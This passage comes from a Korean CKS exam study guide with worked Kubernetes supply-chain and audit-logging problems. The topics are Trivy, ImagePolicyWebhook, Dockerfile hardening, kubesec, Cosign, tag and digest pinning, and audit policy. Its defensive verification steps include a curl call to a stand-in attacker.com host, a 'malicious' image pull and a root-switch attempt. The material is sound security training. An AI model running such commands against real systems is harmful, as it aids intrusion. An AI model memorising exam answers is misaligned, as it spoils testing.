`--exit-code 1`은 지정된 심각도의 취약점이 발견되면 종료 코드 1을 반환한다. CI/CD 파이프라인에서 빌드를 중단하는 데 활용할 수 있다. 오래된 이미지일수록 CRITICAL 취약점이 많다.

**검증 - 공격 시뮬레이션:**
```bash
# CRITICAL 취약점이 있는 이미지 스캔
trivy image --severity CRITICAL --exit-code 1 nginx:1.19
echo "Exit code: $?"
```
```text
nginx:1.19 (debian 10.13)
Total: 15 (CRITICAL: 15)
┌──────────────────────┬────────────────┬──────────┬───────────────────┐
│       Library        │ Vulnerability  │ Severity │  Installed Ver.   │
├──────────────────────┼────────────────┼──────────┼───────────────────┤
│ libssl1.1            │ CVE-2021-3711  │ CRITICAL │ 1.1.1d-0+deb10u7  │
│ ...                  │ ...            │ ...      │ ...               │
└──────────────────────┴────────────────┴──────────┴───────────────────┘
Exit code: 1
```
```bash
# 안전한 이미지 확인
trivy image --severity CRITICAL --exit-code 1 nginx:1.25
echo "Exit code: $?"
```
```text
nginx:1.25 (debian 12.4)
Total: 0 (CRITICAL: 0)
Exit code: 0
```
```bash
# Deployment 이미지 변경 후 확인
kubectl get deployment web -n production -o jsonpath='{.spec.template.spec.containers[0].image}'
```
```text
nginx:1.25
```

**출제 의도:** 컨테이너 이미지의 알려진 취약점(CVE)을 스캔하고 안전한 이미지로 교체하는 능력을 검증한다. 공급망 보안에서 이미지 취약점 관리는 필수 프로세스이다.

**핵심 원리:** Trivy는 이미지의 OS 패키지(dpkg, rpm 등)와 애플리케이션 라이브러리(npm, pip 등)를 분석하여 NVD/GitHub Advisory 등의 취약점 데이터베이스와 대조한다. `--severity CRITICAL`은 CVSS 점수 9.0 이상의 취약점만 필터링한다. `--exit-code 1`은 CI/CD 게이트로 활용되어 취약 이미지의 배포를 자동 차단한다.

**함정과 주의사항:**
- `trivy image`는 기본적으로 이미지를 로컬에 pull한다. 시험 환경에서 네트워크가 느리면 시간이 많이 소요될 수 있다. `--skip-update` 옵션으로 DB 업데이트를 건너뛸 수 있다.
- `nginx:1.25`도 시간이 지나면 CRITICAL 취약점이 발견될 수 있다. 특정 패치 버전(예: `nginx:1.25.4`)을 사용하는 것이 더 안전하다.
- `--severity`에 여러 레벨을 쉼표로 구분할 수 있다: `--severity HIGH,CRITICAL`.

**공격-방어 매핑:**
| 공격 벡터 | 방어 효과 |
|---|---|
| 알려진 CVE 익스플로잇(원격 코드 실행) | CRITICAL 취약점이 없는 이미지로 교체 |
| 취약한 라이브러리를 통한 침투 | 취약점 스캔으로 사전 탐지 |
| 오래된 이미지의 누적 취약점 | 최신 이미지 사용으로 패치 적용 |
</details>

---

### 문제 26. [Supply Chain Security] ImagePolicyWebhook 설정

ImagePolicyWebhook Admission Controller를 활성화하고, 이미지 검증 웹훅을 설정하라. 웹훅이 응답하지 않을 때 기본적으로 이미지를 거부(fail-closed)하도록 설정하라.

<details>
<summary>풀이 확인</summary>

**풀이:**
```bash
# 1. Admission 설정 디렉토리 생성
mkdir -p /etc/kubernetes/admission-control
```

AdmissionConfiguration:
```yaml
# /etc/kubernetes/admission-control/admission-config.yaml
apiVersion: apiserver.config.k8s.io/v1
kind: AdmissionConfiguration
plugins:
- name: ImagePolicyWebhook
  configuration:
    imagePolicy:
      kubeConfigFile: /etc/kubernetes/admission-control/image-policy-webhook.kubeconfig
      allowTTL: 50
      denyTTL: 50
      retryBackoff: 500
      defaultAllow: false
```

Webhook kubeconfig:
```yaml
# /etc/kubernetes/admission-control/image-policy-webhook.kubeconfig
apiVersion: v1
kind: Config
clusters:
- name: image-policy-webhook
  cluster:
    server: https://image-policy-webhook.default.svc:443/image-policy
    certificate-authority: /etc/kubernetes/pki/ca.crt
contexts:
- name: image-policy-webhook
  context:
    cluster: image-policy-webhook
    user: api-server
current-context: image-policy-webhook
users:
- name: api-server
  user:
    client-certificate: /etc/kubernetes/pki/apiserver.crt
    client-key: /etc/kubernetes/pki/apiserver.key
```

API server 매니페스트 수정:
```bash
cp /etc/kubernetes/manifests/kube-apiserver.yaml /tmp/kube-apiserver.yaml.bak
vi /etc/kubernetes/manifests/kube-apiserver.yaml
```
```yaml
spec:
  containers:
  - command:
    - kube-apiserver
    - --enable-admission-plugins=NodeRestriction,ImagePolicyWebhook
    - --admission-control-config-file=/etc/kubernetes/admission-control/admission-config.yaml
    volumeMounts:
    - name: admission-control
      mountPath: /etc/kubernetes/admission-control/
      readOnly: true
  volumes:
  - name: admission-control
    hostPath:
      path: /etc/kubernetes/admission-control/
      type: DirectoryOrCreate
```
```bash
# API server 재시작 대기
watch crictl ps | grep kube-apiserver
kubectl get nodes  # 정상 동작 확인
```

`defaultAllow: false`는 fail-closed 정책이다. 웹훅이 응답하지 않거나 에러가 발생하면 이미지 사용을 거부한다. 보안 관점에서 이것이 올바른 설정이다.

**검증 - 공격 시뮬레이션:**
```bash
# API server 재시작 후 정상 동작 확인
kubectl get nodes
```
```text
NAME           STATUS   ROLES           AGE   VERSION
controlplane   Ready    control-plane   30d   v1.29.0
```
```bash
# ImagePolicyWebhook이 동작하는지 확인: 검증되지 않은 이미지 사용 시도
kubectl run test --image=unknown-registry.io/malicious:latest
```
```text
Error from server (Forbidden): pods "test" is forbidden: image policy webhook backend denied one or more images
```
```bash
# 웹훅이 다운된 상태에서 Pod 생성 시도 (fail-closed 동작)
# defaultAllow: false이므로 거부됨
```
```text
Error from server (Forbidden): pods "test" is forbidden: Post "https://image-policy-webhook...": dial tcp: connection refused
```

**출제 의도:** ImagePolicyWebhook 어드미션 컨트롤러를 설정하여 이미지 배포 전 외부 검증 시스템과 연동하는 능력을 검증한다. fail-closed vs fail-open의 보안적 의미를 이해해야 한다.

**핵심 원리:** ImagePolicyWebhook은 API server가 Pod 생성 요청을 받으면 설정된 웹훅 서버에 이미지 정보를 전달하고, 서버의 승인/거부 응답에 따라 요청을 처리하는 어드미션 컨트롤러이다. `defaultAllow: false`(fail-closed)는 웹훅 서버가 응답하지 않을 때 안전한 기본값(거부)을 사용한다. `allowTTL/denyTTL`은 승인/거부 결과를 캐시하는 시간이다.

**함정과 주의사항:**
- `--enable-admission-plugins`에 `ImagePolicyWebhook`을 추가할 때 기존 플러그인(NodeRestriction 등)을 유지해야 한다.
- `--admission-control-config-file`의 volume/volumeMount를 빠뜨리면 API server가 시작되지 않는다.
- kubeconfig 파일의 인증서 경로가 API server 컨테이너 내부 경로여야 한다. 호스트 경로와 혼동하면 안 된다.
- `defaultAllow: true`(fail-open)로 설정하면 웹훅 장애 시 모든 이미지가 허용되어 보안이 무력화된다.

**공격-방어 매핑:**
| 공격 벡터 | 방어 효과 |
|---|---|
| 서명되지 않은 악성 이미지 배포 | 웹훅이 서명 검증 후 거부 |
| 취약점이 있는 이미지 배포 | 웹훅이 취약점 스캔 결과 기반 거부 |
| 웹훅 서버 DDoS로 보안 우회 | fail-closed로 웹훅 장애 시에도 거부 |
</details>

---

### 문제 27. [Supply Chain Security] Dockerfile 보안 수정

다음 Dockerfile의 보안 문제를 모두 수정하라:
```dockerfile
FROM ubuntu:latest
RUN apt-get update && apt-get install -y curl wget vim python3 python3-pip
ADD https://example.com/app.tar.gz /app/
WORKDIR /app
RUN pip3 install -r requirements.txt
EXPOSE 8080
CMD ["python3", "app.py"]
```

<details>
<summary>풀이 확인</summary>

**풀이:**

수정된 Dockerfile:
```dockerfile
# 1. latest 대신 특정 버전 지정
# 2. ubuntu 대신 slim 베이스 이미지 사용
FROM python:3.12-slim AS builder

WORKDIR /app
COPY requirements.txt .
RUN pip3 install --no-cache-dir --user -r requirements.txt
COPY . .

# 멀티스테이지 빌드
FROM python:3.12-slim

# 3. 불필요한 패키지(curl, wget, vim) 설치하지 않음
WORKDIR /app

# 4. ADD 대신 COPY 사용
COPY --from=builder /root/.local /root/.local
COPY --from=builder /app .

ENV PATH=/root/.local/bin:$PATH

# 5. non-root 사용자로 실행
RUN useradd -r -u 1000 appuser
USER 1000:1000

EXPOSE 8080

HEALTHCHECK --interval=30s --timeout=3s \
  CMD python3 -c "import urllib.request; urllib.request.urlopen('http://localhost:8080/health')" || exit 1

CMD ["python3", "app.py"]
```

수정 사항 정리:
1. `FROM ubuntu:latest` -> `FROM python:3.12-slim`: 특정 버전 지정, 최소 베이스 이미지
2. 불필요한 패키지(curl, wget, vim) 제거: 공격 표면 감소
3. `ADD` -> `COPY`: ADD는 URL 다운로드와 tar 자동 해제 등 예상치 못한 동작이 가능하다
4. `USER 1000:1000` 추가: non-root 실행
5. 멀티스테이지 빌드: 빌드 도구가 최종 이미지에 포함되지 않음
6. HEALTHCHECK 추가

**검증 - 공격 시뮬레이션:**
```bash
# 수정된 이미지에서 공격 도구 사용 불가 확인
docker run --rm secure-app curl http://attacker.com
```
```text
docker: Error response from daemon: OCI runtime create failed: container_linux.go:380: starting container process caused: exec: "curl": executable file not found in $PATH
```
```bash
# non-root 사용자로 실행 확인
docker run --rm secure-app id
```
```text
uid=1000(appuser) gid=1000(appuser) groups=1000(appuser)
```
```bash
# 루트 전환 불가 확인
docker run --rm secure-app su root -c "id"
```
```text
su: must be run from a terminal
```
```bash
# Trivy로 이미지 크기 및 취약점 감소 확인
trivy image --severity CRITICAL secure-app
```
```text
secure-app (debian 12.4)
Total: 0 (CRITICAL: 0)
```

**출제 의도:** Dockerfile의 보안 안티패턴을 식별하고 수정하는 능력을 검증한다. 이미지 빌드 단계에서 보안을 강화하는 것은 공급망 보안의 첫 단계이다.

**핵심 원리:** `FROM`의 `latest` 태그는 빌드 시점에 따라 다른 이미지를 가져오므로 재현성이 없고, 알려진 취약점이 포함될 수 있다. `ADD`는 URL 다운로드와 tar 자동 해제를 수행하므로 원격 파일 주입 공격에 취약하다. `USER` 지시문은 컨테이너의 UID를 변경하여 DAC 보호를 적용한다. 멀티스테이지 빌드는 빌드 의존성(컴파일러, 빌드 도구)을 최종 이미지에서 제외하여 공격 표면을 줄인다.

**함정과 주의사항:**
- `USER 1000`만 지정하면 GID가 root(0)가 될 수 있다. `USER 1000:1000`으로 UID와 GID를 모두 지정하라.
- `COPY --from=builder`에서 빌더 스테이지 이름을 정확히 지정해야 한다.
- `--no-cache-dir`은 pip 캐시를 제거하여 이미지 크기를 줄인다.
- 시험에서 Dockerfile을 "수정"하라고 하면 원본을 기반으로 보안 문제를 하나씩 수정하는 것이 정답이다. 완전히 새로 작성할 필요는 없다.

**공격-방어 매핑:**
| 공격 벡터 | 방어 효과 |
|---|---|
| 컨테이너 내 curl/wget으로 악성 페이로드 다운로드 | 불필요한 패키지 미설치 |
| 루트 권한으로 호스트 파일 접근 | USER 지시문으로 비루트 실행 |
| 빌드 도구(pip, gcc)를 이용한 공격 | 멀티스테이지 빌드로 최종 이미지에서 제거 |
| latest 태그의 이미지 변조 | 특정 버전 태그 사용으로 불변성 보장 |
</details>

---

### 문제 28. [Supply Chain Security] Static Analysis - kubesec

다음 Pod 매니페스트를 kubesec으로 스캔하고, 보안 점수를 높이기 위해 수정하라.

```yaml
apiVersion: v1
kind: Pod
metadata:
  name: insecure-pod
spec:
  containers:
  - name: app
    image: nginx
    securityContext:
      privileged: true
```

<details>
<summary>풀이 확인</summary>

**풀이:**
```bash
# 1. kubesec으로 스캔
kubesec scan insecure-pod.yaml

# 또는 온라인 스캔
curl -sSX POST --data-binary @insecure-pod.yaml https://v2.kubesec.io/scan

# 출력에서 scoring과 advise를 확인
# Critical: privileged=true (높은 위험)
# Advise: runAsNonRoot, readOnlyRootFilesystem, capabilities drop 등
```

수정된 매니페스트:
```yaml
apiVersion: v1
kind: Pod
metadata:
  name: secure-pod
spec:
  securityContext:
    runAsNonRoot: true
    runAsUser: 1000
    seccompProfile:
      type: RuntimeDefault
  containers:
  - name: app
    image: nginx:1.25
    securityContext:
      privileged: false
      allowPrivilegeEscalation: false
      readOnlyRootFilesystem: true
      capabilities:
        drop: ["ALL"]
    resources:
      limits:
        cpu: "200m"
        memory: "128Mi"
      requests:
        cpu: "100m"
        memory: "64Mi"
    volumeMounts:
    - name: tmp
      mountPath: /tmp
  volumes:
  - name: tmp
    emptyDir: {}
```
```bash
# 재스캔하여 점수 향상 확인
kubesec scan secure-pod.yaml
```

kubesec은 매니페스트의 보안 설정을 점수화한다. `privileged: true`는 가장 높은 감점 요소이다. `runAsNonRoot`, `readOnlyRootFilesystem`, `capabilities.drop: ALL` 등이 점수를 높이는 주요 설정이다.

**검증 - 공격 시뮬레이션:**
```bash
# 취약한 매니페스트 스캔 (낮은 점수)
kubesec scan insecure-pod.yaml | jq '.[0].score'
```
```text
-30
```
```bash
# 수정된 매니페스트 스캔 (높은 점수)
kubesec scan secure-pod.yaml | jq '.[0].score'
```
```text
9
```
```bash
# 상세 scoring 확인
kubesec scan secure-pod.yaml | jq '.[0].scoring'
```
```text
{
  "passed": [
    {"id": "ReadOnlyRootFilesystem", "points": 1},
    {"id": "RunAsNonRoot", "points": 1},
    {"id": "RunAsUser", "points": 1},
    {"id": "CapDropAll", "points": 1},
    ...
  ],
  "advise": [...]
}
```

**출제 의도:** 정적 분석 도구를 사용하여 Kubernetes 매니페스트의 보안 설정을 점검하고 개선하는 능력을 검증한다. 배포 전 보안 게이트로 활용된다.

**핵심 원리:** kubesec은 매니페스트의 securityContext, 볼륨, 리소스 설정 등을 분석하여 보안 점수를 산출한다. 양수 점수(가점)는 보안 강화 설정(readOnlyRootFilesystem, runAsNonRoot 등)에, 음수 점수(감점)는 위험 설정(privileged, hostNetwork 등)에 부여된다. CI/CD 파이프라인에서 최소 점수 임계값을 설정하여 보안이 부족한 매니페스트의 배포를 차단할 수 있다.

**함정과 주의사항:**
- kubesec은 온라인(`v2.kubesec.io/scan`)과 오프라인(바이너리) 두 가지 모드로 사용 가능하다. 시험 환경에서 네트워크가 제한될 수 있으므로 바이너리 방식을 먼저 시도하라.
- `resources.limits`를 설정하지 않으면 advise에 포함된다. 리소스 제한은 DoS 방지를 위한 보안 설정이다.
- kubesec의 점수는 절대적 기준이 아니다. 프로젝트 요구사항에 따라 임계값을 조정해야 한다.

**공격-방어 매핑:**
| 공격 벡터 | 방어 효과 |
|---|---|
| privileged 컨테이너로 호스트 탈출 | privileged=false 강제, 감점 항목 제거 |
| 리소스 제한 없는 Pod로 DoS | resources.limits 설정 |
| 보안 설정 누락 워크로드 배포 | 최소 점수 기반 배포 게이트 |
</details>

---

### 문제 29. [Supply Chain Security] 이미지 서명 및 검증 (Cosign)

Cosign을 사용하여 이미지를 서명하고 검증하는 절차를 수행하라:
1. 키 쌍을 생성하라
2. `registry.example.com/myapp:v1.0` 이미지에 서명하라
3. 서명을 검증하라

<details>
<summary>풀이 확인</summary>

**풀이:**
```bash
# 1. 키 쌍 생성
cosign generate-key-pair
# cosign.key (비밀키)와 cosign.pub (공개키) 생성됨

# 2. 이미지 서명
cosign sign --key cosign.key registry.example.com/myapp:v1.0

# 3. 서명 검증
cosign verify --key cosign.pub registry.example.com/myapp:v1.0

# 출력 예:
# Verification for registry.example.com/myapp:v1.0 --
# The following checks were performed on each of these signatures:
#   - The cosign claims were validated
#   - The signatures were verified against the specified public key

# 4. 서명 정보 확인
cosign triangulate registry.example.com/myapp:v1.0

# 5. Keyless 서명 (OIDC 기반)
cosign sign registry.example.com/myapp:v1.0
# 브라우저에서 OIDC 인증 수행

cosign verify \
  --certificate-identity=user@example.com \
  --certificate-oidc-issuer=https://accounts.google.com \
  registry.example.com/myapp:v1.0
```

Cosign은 Sigstore 프로젝트의 일부로, 컨테이너 이미지에 디지털 서명을 추가하여 무결성과 출처를 검증할 수 있게 한다. 서명은 OCI 레지스트리에 별도의 아티팩트로 저장된다.

**검증 - 공격 시뮬레이션:**
```bash
# 서명된 이미지 검증 성공
cosign verify --key cosign.pub registry.example.com/myapp:v1.0
```
```text
Verification for registry.example.com/myapp:v1.0 --
The following checks were performed on each of these signatures:
  - The cosign claims were validated
  - The signatures were verified against the specified public key

[{"critical":{"identity":{"docker-reference":"registry.example.com/myapp"},...}]
```
```bash
# 서명되지 않은 이미지 검증 실패
cosign verify --key cosign.pub registry.example.com/untrusted:v1.0
```
```text
Error: no matching signatures: failed to verify signature
```
```bash
# 변조된 이미지 검증 실패 (이미지가 수정된 경우)
cosign verify --key cosign.pub registry.example.com/myapp:v1.0-tampered
```
```text
Error: no matching signatures: cryptographic signature verification failed
```

**출제 의도:** 이미지 서명/검증 워크플로를 이해하고 Cosign을 사용하여 공급망 무결성을 보장하는 능력을 검증한다. 서명되지 않은 이미지의 배포를 차단하는 것이 목표이다.

**핵심 원리:** Cosign은 ECDSA(타원 곡선 디지털 서명 알고리즘)를 사용하여 이미지 다이제스트에 서명한다. 서명은 OCI 레지스트리에 태그 형식(`sha256-<hash>.sig`)으로 저장된다. 검증 시 공개키로 서명을 검증하고, 서명된 다이제스트와 현재 이미지 다이제스트를 비교한다. Keyless 방식은 Sigstore의 Fulcio(인증서 발급)와 Rekor(투명성 로그)를 사용하여 키 관리 부담을 제거한다.

**함정과 주의사항:**
- `cosign generate-key-pair`로 생성된 비밀키(`cosign.key`)는 안전하게 보관해야 한다. 유출되면 공격자가 악성 이미지에 서명할 수 있다.
- `cosign sign`은 이미지를 태그가 아닌 다이제스트로 서명한다. 태그가 다른 이미지를 가리키도록 변경되면 검증이 실패한다.
- 키 기반 서명과 Keyless 서명을 혼동하면 안 된다. 시험에서 키 기반 방식을 주로 물어본다.

**공격-방어 매핑:**
| 공격 벡터 | 방어 효과 |
|---|---|
| 레지스트리 침해로 이미지 변조 | 서명 검증 실패로 변조 탐지 |
| 악성 이미지를 정상 태그로 위장 | 다이제스트 기반 서명으로 위장 불가 |
| 비인가 빌드 파이프라인의 이미지 배포 | 정상 키로 서명되지 않은 이미지 거부 |
</details>

---

### 문제 30. [Supply Chain Security] 특정 이미지 태그 사용 금지

클러스터에서 `latest` 태그가 사용된 컨테이너 이미지를 가진 모든 Pod를 찾아라. 그리고 해당 이미지를 특정 버전 태그로 수정하라.

<details>
<summary>풀이 확인</summary>

**풀이:**
```bash
# 1. latest 태그 또는 태그 없는 이미지를 사용하는 Pod 찾기
kubectl get pods --all-namespaces -o json | \
  jq -r '.items[] | select(.spec.containers[]? |
    (.image | test(":latest$")) or (.image | test(":") | not)) |
    "\(.metadata.namespace)/\(.metadata.name): \(.spec.containers[].image)"'

# 2. Deployment에서 이미지 태그 수정
kubectl set image deployment/web nginx=nginx:1.25 -n production

# 3. 또는 직접 수정
kubectl edit deployment web -n production
# image: nginx:latest -> image: nginx:1.25

# 4. OPA Gatekeeper로 latest 태그 사용을 금지하는 정책도 적용 가능
```

`latest` 태그는 이미지의 버전을 특정할 수 없어 보안과 재현성 측면에서 위험하다. 항상 구체적인 버전 태그(예: `nginx:1.25.3`) 또는 이미지 다이제스트(예: `nginx@sha256:abc...`)를 사용해야 한다.

**검증 - 공격 시뮬레이션:**
```bash
# latest 태그 사용 Pod 검색
kubectl get pods --all-namespaces -o json | \
  jq -r '.items[] | select(.spec.containers[]? |
    (.image | test(":latest$")) or (.image | test(":") | not)) |
    "\(.metadata.namespace)/\(.metadata.name): \(.spec.containers[].image)"'
```
```text
default/legacy-app: nginx:latest
staging/old-worker: redis
production/web-old: python:latest
```
```bash
# latest 태그 이미지를 특정 버전으로 교체 후 확인
kubectl set image deployment/web nginx=nginx:1.25.4 -n production
kubectl get deployment web -n production -o jsonpath='{.spec.template.spec.containers[0].image}'
```
```text
nginx:1.25.4
```

**출제 의도:** 이미지 태그 관리를 통한 배포 재현성과 보안 확보 능력을 검증한다. `latest` 태그는 버전 고정이 안 되어 의도치 않은 이미지 변경에 취약하다.

**핵심 원리:** 컨테이너 이미지 태그는 레지스트리의 포인터일 뿐이다. `latest` 태그는 새 이미지가 push되면 자동으로 이동한다. 즉, 동일한 태그가 다른 시점에 다른 이미지를 가리킬 수 있다. 이는 "tag mutability" 문제이다. 다이제스트(`@sha256:...`)는 이미지 레이어의 해시이므로 불변이다. `imagePullPolicy: Always`가 설정된 경우 Pod 재시작 시 다른 이미지가 pull될 수 있다.

**함정과 주의사항:**
- 태그 없이 `nginx`만 쓰면 자동으로 `nginx:latest`로 해석된다. jq 필터에서 태그가 없는 경우도 검색해야 한다.
- `kubectl set image`로 이미지를 변경하면 Deployment가 롤링 업데이트를 수행한다.
- OPA Gatekeeper로 `latest` 태그 사용을 정책적으로 금지하는 것이 근본적 해결책이다.

**공격-방어 매핑:**
| 공격 벡터 | 방어 효과 |
|---|---|
| latest 태그 이미지에 악성 코드 주입 | 특정 버전 태그로 이미지 고정 |
| 태그 변조(같은 태그에 다른 이미지 push) | 다이제스트 사용으로 불변성 보장 |
| imagePullPolicy: Always로 인한 의도치 않은 변경 | 고정된 태그로 예측 가능한 배포 |
</details>

---

### 문제 31. [Supply Chain Security] Trivy로 실행 중인 워크로드 스캔

클러스터에서 실행 중인 모든 Pod의 컨테이너 이미지를 Trivy로 스캔하고, HIGH 이상의 취약점이 있는 이미지 목록을 파일로 저장하라.

<details>
<summary>풀이 확인</summary>

**풀이:**
```bash
# 1. 실행 중인 모든 고유 이미지 목록 추출
kubectl get pods --all-namespaces -o jsonpath='{range .items[*]}{range .spec.containers[*]}{.image}{"\n"}{end}{end}' | sort -u > /tmp/all-images.txt

# 2. 각 이미지를 Trivy로 스캔하고 취약한 이미지 목록 작성
> /tmp/vulnerable-images.txt
while read -r image; do
  echo "Scanning: $image"
  if trivy image --exit-code 1 --severity HIGH,CRITICAL --quiet "$image" 2>/dev/null; then
    echo "PASS: $image"
  else
    echo "$image" >> /tmp/vulnerable-images.txt
    echo "FAIL: $image (HIGH/CRITICAL vulnerabilities found)"
  fi
done < /tmp/all-images.txt

# 3. 결과 확인
echo "=== Vulnerable Images ==="
cat /tmp/vulnerable-images.txt

# 4. 상세 리포트 생성 (선택)
while read -r image; do
  echo "=== $image ===" >> /tmp/vulnerability-report.txt
  trivy image --severity HIGH,CRITICAL "$image" >> /tmp/vulnerability-report.txt 2>&1
  echo "" >> /tmp/vulnerability-report.txt
done < /tmp/vulnerable-images.txt
```

이 방법은 클러스터 보안 감사(audit)의 일환으로 수행된다. 주기적으로 스캔하여 새로운 CVE가 영향을 미치는 이미지를 식별하고 업데이트 계획을 수립해야 한다.

**검증 - 공격 시뮬레이션:**
```bash
# 실행 중인 고유 이미지 수 확인
wc -l /tmp/all-images.txt
```
```text
12 /tmp/all-images.txt
```
```bash
# 취약 이미지 목록 확인
cat /tmp/vulnerable-images.txt
```
```text
nginx:1.19
python:3.8
redis:6.0
```
```bash
# 특정 이미지의 CRITICAL 취약점 상세 확인
trivy image --severity CRITICAL nginx:1.19 2>/dev/null | head -20
```
```text
nginx:1.19 (debian 10.13)
Total: 15 (CRITICAL: 15)
┌──────────────────────┬────────────────┬──────────┐
│       Library        │ Vulnerability  │ Severity │
├──────────────────────┼────────────────┼──────────┤
│ libssl1.1            │ CVE-2021-3711  │ CRITICAL │
│ libc6                │ CVE-2021-33574 │ CRITICAL │
│ ...                  │ ...            │ ...      │
└──────────────────────┴────────────────┴──────────┘
```

**출제 의도:** 운영 중인 클러스터의 이미지 취약점을 일괄 스캔하고 보안 감사 보고서를 생성하는 능력을 검증한다. 지속적 보안 모니터링의 핵심 프로세스이다.

**핵심 원리:** `kubectl get pods -o jsonpath`로 클러스터의 모든 컨테이너 이미지를 추출한 후, `sort -u`로 중복을 제거하고 Trivy로 일괄 스캔한다. `--exit-code 1`은 취약점 발견 시 비정상 종료 코드를 반환하므로 쉘 스크립트에서 조건 분기에 활용된다. `--quiet` 옵션은 진행 상황을 숨기고 결과만 출력한다.

**함정과 주의사항:**
- initContainers의 이미지도 추출해야 완전한 스캔이 된다. jsonpath에 `.spec.initContainers[*].image`도 포함하라.
- `kube-system` 네임스페이스의 시스템 이미지(etcd, kube-apiserver 등)도 스캔 대상에 포함된다.
- Trivy가 이미지를 pull하므로, private registry 이미지는 인증 설정이 필요하다.
- 결과 파일 경로(`/tmp/vulnerable-images.txt`)를 시험 문제가 지정한 경로와 정확히 일치시켜야 한다.

**공격-방어 매핑:**
| 공격 벡터 | 방어 효과 |
|---|---|
| 새로 발견된 CVE의 제로데이 공격 | 정기 스캔으로 영향받는 이미지 조기 식별 |
| 오래된 이미지의 누적 취약점 | 일괄 스캔으로 전수 취약점 파악 |
| 모니터링 사각지대의 워크로드 | 모든 네임스페이스 스캔으로 누락 방지 |
</details>

---

### 문제 32. [Supply Chain Security] 이미지 다이제스트 사용

`web` Deployment의 컨테이너 이미지를 태그 대신 다이제스트(digest)로 지정하여 이미지 변조를 방지하라. 현재 이미지는 `nginx:1.25`이다.

<details>
<summary>풀이 확인</summary>

**풀이:**
```bash
# 1. 이미지 다이제스트 확인
# 방법 1: docker/crane/skopeo 사용
crane digest nginx:1.25
# sha256:abc123def456...

# 방법 2: trivy로 확인
trivy image --format json nginx:1.25 | jq '.Results[0].Target'

# 방법 3: 레지스트리에서 직접 확인
docker inspect --format='{{index .RepoDigests 0}}' nginx:1.25

# 2. Deployment의 이미지를 다이제스트로 변경
kubectl set image deployment/web nginx=nginx@sha256:abc123def456... -n production

# 또는
kubectl edit deployment web -n production
# image: nginx:1.25 -> image: nginx@sha256:abc123def456...

# 3. 확인
kubectl get deployment web -n production -o jsonpath='{.spec.template.spec.containers[0].image}'
```

태그는 같은 이름으로 다른 이미지를 가리킬 수 있지만, 다이제스트(SHA256 해시)는 특정 이미지를 불변으로 식별한다. 다이제스트를 사용하면 이미지가 변조되었을 때 pull이 실패하므로 보안이 강화된다.

**검증 - 공격 시뮬레이션:**
```bash
# 다이제스트 확인
crane digest nginx:1.25
```
```text
sha256:6db391d1c0cfb30588ba0bf72ea999404f2764e3dce8b2ae8c6ee57d5aefb42c
```
```bash
# 다이제스트로 이미지 지정 후 Deployment 확인
kubectl get deployment web -n production -o jsonpath='{.spec.template.spec.containers[0].image}'
```
```text
nginx@sha256:6db391d1c0cfb30588ba0bf72ea999404f2764e3dce8b2ae8c6ee57d5aefb42c
```
```bash
# 이미지가 변조되면 pull 실패 (다이제스트 불일치)
# 레지스트리에서 이미지가 변경된 경우:
kubectl describe pod web-xxx -n production | grep "Failed"
```
```text
Warning  Failed  1m  kubelet  Failed to pull image "nginx@sha256:6db...": manifest unknown
```

**출제 의도:** 이미지 다이제스트를 사용하여 이미지 변조를 방지하는 능력을 검증한다. 태그는 mutable이지만 다이제스트는 immutable이다.

**핵심 원리:** 이미지 다이제스트는 이미지 매니페스트(레이어 해시 목록)의 SHA-256 해시이다. 이미지의 어떤 레이어라도 변경되면 매니페스트가 변경되고, 따라서 다이제스트도 변경된다. 레지스트리에서 다이제스트로 이미지를 요청하면, 레지스트리는 해당 다이제스트와 정확히 일치하는 이미지만 반환한다. 일치하는 이미지가 없으면 "manifest unknown" 에러를 반환한다.

**함정과 주의사항:**
- 다이제스트는 태그와 함께 사용할 수 없다. `nginx:1.25@sha256:abc...`가 아니라 `nginx@sha256:abc...`로 지정해야 한다.
- `docker inspect`는 로컬에 이미지가 있어야 한다. `crane digest`나 `skopeo inspect`는 로컬 pull 없이 다이제스트를 확인할 수 있다.
- 다이제스트를 사용하면 이미지 업데이트 시 다이제스트도 함께 변경해야 한다. 자동화 도구(Renovate, Dependabot 등)와 연동하면 관리가 용이하다.
- 멀티 아키텍처 이미지의 경우 매니페스트 리스트 다이제스트와 아키텍처별 다이제스트가 다르다.

**공격-방어 매핑:**
| 공격 벡터 | 방어 효과 |
|---|---|
| 레지스트리 침해 후 같은 태그에 악성 이미지 push | 다이제스트 불일치로 pull 실패 |
| 빌드 파이프라인 변조로 다른 이미지 배포 | 다이제스트 고정으로 변조 탐지 |
| 태그 재사용을 통한 이미지 교체 공격 | 다이제스트는 불변이므로 교체 불가 |
</details>

---

## Monitoring, Logging and Runtime Security (20%) - 8문제

### 문제 33. [Runtime Security] Audit Policy 작성

다음 요구사항을 만족하는 Audit Policy를 작성하고 API server에 적용하라:
1. Secret에 대한 모든 요청을 RequestResponse 레벨로 기록
2. Pod에 대한 create, delete 요청을 Request 레벨로 기록
3. 시스템 컴포넌트(system:nodes 그룹)의 get/list/watch 요청은 기록하지 않음
4. 나머지 모든 요청은 Metadata 레벨로 기록

<details>
<summary>풀이 확인</summary>

**풀이:**

파일: `/etc/kubernetes/audit-policy.yaml`
```yaml
apiVersion: audit.k8s.io/v1
kind: Policy
rules:
  # 1. Secret에 대한 모든 요청 (RequestResponse)
  - level: RequestResponse
    resources:
    - group: ""
      resources: ["secrets"]

  # 2. Pod에 대한 create, delete 요청 (Request)
  - level: Request
    resources:
    - group: ""
      resources: ["pods"]
    verbs: ["create", "delete"]

  # 3. 시스템 컴포넌트의 읽기 요청 제외 (None)
  - level: None
    userGroups: ["system:nodes"]
    verbs: ["get", "list", "watch"]

  # 4. 나머지 모든 요청 (Metadata)
  - level: Metadata
    omitStages:
    - "RequestReceived"
```

API server에 적용:
```bash
# 매니페스트 백업
cp /etc/kubernetes/manifests/kube-apiserver.yaml /tmp/kube-apiserver.yaml.bak

# 로그 디렉토리 생성
mkdir -p /var/log/kubernetes/audit/

vi /etc/kubernetes/manifests/kube-apiserver.yaml
```

추가할 플래그 및 볼륨:
```yaml
spec:
  containers:
  - command:
    - kube-apiserver
    - --audit-policy-file=/etc/kubernetes/audit-policy.yaml
    - --audit-log-path=/var/log/kubernetes/audit/audit.log
    - --audit-log-maxage=30
    - --audit-log-maxbackup=10
    - --audit-log-maxsize=100
    volumeMounts:
    - name: audit-policy
      mountPath: /etc/kubernetes/audit-policy.yaml
      readOnly: true
    - name: audit-log
      mountPath: /var/log/kubernetes/audit/
  volumes:
  - name: audit-policy
    hostPath:
      path: /etc/kubernetes/audit-policy.yaml
      type: File
  - name: audit-log
    hostPath:
      path: /var/log/kubernetes/audit/
      type: DirectoryOrCreate
```
```bash
